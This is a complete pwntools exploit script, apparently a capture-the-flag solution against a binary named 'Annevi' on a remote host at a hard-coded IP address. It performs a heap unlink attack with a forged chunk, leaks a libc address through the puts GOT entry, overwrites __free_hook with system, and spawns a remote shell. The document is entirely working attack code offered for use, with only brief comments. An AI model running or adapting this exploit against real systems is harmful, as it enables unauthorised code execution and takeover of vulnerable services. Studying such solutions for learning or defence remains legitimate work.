from pwn import*
p = remote('47.103.214.163',20301)
#p = process('./Annevi')
elf = ELF('Annevi')
libc = ELF('libc-2.23.so')
puts_got = elf.got['puts']
context.log_level = 'debug'
context(arch = 'amd64',os ='linux')
def add(size,content):
	p.sendlineafter('edit\n:','1')
	p.sendlineafter('size?',str(size)) # size>=144
	p.sendlineafter('content:',content)
def dele(index):
	p.sendlineafter('edit\n:','2')
	p.sendlineafter('index?',str(index))
def show(index):
	p.sendlineafter('edit\n:','3')
	p.sendlineafter('index?',str(index))
def edit(index,content):
	p.sendlineafter('edit\n:','4')
	p.sendlineafter('index?',str(index))
	p.sendlineafter('content:',content)
List = 0x602040
add(0x90,'U'*0x10)	#0
add(0x90,'U'*0x10)	#1
#----------create the fake chunk
payload  = p64(0)
payload += p64(0x90) # size
payload += p64(List - 0x18) # fd List[0]-0x18
payload += p64(List - 0x10) # bk List[0]-0x10
#----------
payload = payload.ljust(0x90,'\x00') #padding
payload += p64(0x90)
payload += p64(0xA0)
edit(0,payload)
dele(1)
payload = 'U'*0x18 + p64(puts_got) + p64(List)
edit(0,payload)
show(0)
p.recvuntil('content:')
libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['puts']
log.success('LibcBase:\t' + hex(libcbase))
system = libcbase + libc.sym['system']
str_bin_sh = libcbase + 0x18CD57
free_hook = libcbase + 0x3C67A8
edit(1,p64(free_hook)+p64(str_bin_sh))
edit(0,p64(system))
dele(1)
p.interactive()
